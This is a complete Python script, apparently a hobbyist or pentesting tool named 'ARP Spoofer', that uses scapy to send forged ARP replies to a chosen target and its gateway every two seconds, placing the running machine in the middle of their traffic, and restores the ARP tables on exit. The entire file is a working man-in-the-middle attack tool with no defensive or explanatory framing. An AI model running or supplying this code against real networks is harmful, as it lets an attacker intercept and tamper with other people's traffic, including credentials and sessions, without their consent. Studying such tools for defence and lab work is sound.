import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="target_ip", help="Target IP (ex: 192.168.1.44)")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway of the network (ex: 192.168.1.1)")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[!] Please add an target ip to proceed, --help for more informations.")
    if not options.gateway:
        parser.error("[!] Please add a gateway to proceed, --help for more informations.")
    return options

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_request
    ask_list = scapy.srp(packet, timeout = 1, verbose = False)[0]
    
    return ask_list[0][1].hwsrc

def spoof(ip_target, spoof_ip):
    target_mac = get_mac_address(ip_target)
    packet = scapy.ARP(op = 2, pdst = ip_target, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore_default(dest_target, dest_router):
    dest_mac = get_mac_address(dest_target)
    source_mac = get_mac_address(dest_router)
    packet = scapy.ARP(op = 2, pdst = dest_target, hwdst = dest_mac, psrc = dest_router, hwsrc = source_mac)
    # Setting destination IP, Setting Destination MAC Address, Setting the source IP and the source of the router
    # print(packet.show())
    scapy.send(packet, verbose = False, count = 4)

options = get_arguments()
packet_count = 0
print("""
 ______     ______     ______      ______     ______   ______     ______     ______   ______     ______    
/\  __ \   /\  == \   /\  == \    /\  ___\   /\  == \ /\  __ \   /\  __ \   /\  ___\ /\  ___\   /\  == \   
\ \  __ \  \ \  __<   \ \  _-/    \ \___  \  \ \  _-/ \ \ \/\ \  \ \ \/\ \  \ \  __\ \ \  __\   \ \  __<   
 \ \_\ \_\  \ \_\ \_\  \ \_\       \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_____\  \ \_\ \_\ 
  \/_/\/_/   \/_/ /_/   \/_/        \/_____/   \/_/     \/_____/   \/_____/   \/_/     \/_____/   \/_/ /_/ 
                                                                                                          
""")
try:
    while True:
        spoof(options.target_ip, options.gateway)
        spoof(options.gateway, options.target_ip)
        packet_count = packet_count + 2
        print("\r[+] Packets sent : " + str(packet_count), end = "")
        time.sleep(2) # sleep for 2 second to not flood the network
except KeyboardInterrupt:
    restore_default(options.target_ip, options.gateway)
    restore_default(options.gateway, options.target_ip)
    print("\n[/!\] Quit - Restoring ARP tables..")
